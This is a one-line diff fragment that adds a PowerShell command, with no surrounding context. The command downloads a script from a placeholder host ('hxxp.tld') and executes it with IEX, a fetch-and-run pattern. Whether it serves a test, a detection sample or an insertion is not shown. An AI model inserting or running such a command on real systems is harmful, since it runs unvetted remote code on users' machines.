@@ -1,0 +1,1 @@
+Invoke-WebRequest http://hxxp.tld/p.ps1 -OutFile p.ps1; IEX(Get-Content p.ps1)
